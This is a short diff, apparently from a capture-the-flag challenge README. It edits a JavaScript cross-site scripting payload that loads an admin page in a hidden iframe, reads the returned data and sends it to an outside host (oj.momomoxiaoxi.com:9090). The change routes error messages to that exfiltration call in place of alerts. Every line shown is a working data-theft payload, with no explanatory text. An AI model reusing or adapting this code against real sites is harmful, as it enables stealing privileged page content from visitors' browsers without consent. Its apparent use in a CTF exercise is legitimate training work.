@@ -129,10 +129,9 @@ docker-compose up -d
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
-                   alert(data);
                    send_secret(data);
                }
-               else  alert('Error: ' + data["error"]);
+               else  send_secret(data["error"]);
            }
        });
    }
@@ -141,7 +140,6 @@ docker-compose up -d
        var url = 'http://oj.momomoxiaoxi.com:9090'
        $.get(url, {'key1':data});
    }
-   document.write("<script type='text/javascript' src='https://code.jquery.com/jquery-3.3.1.min.js'></script>");
    var iframe = document.createElement('iframe');
    iframe.src = "http://ctf.momomoxiaoxi.com/admin/index.php";
    iframe.onload = frameOnload;
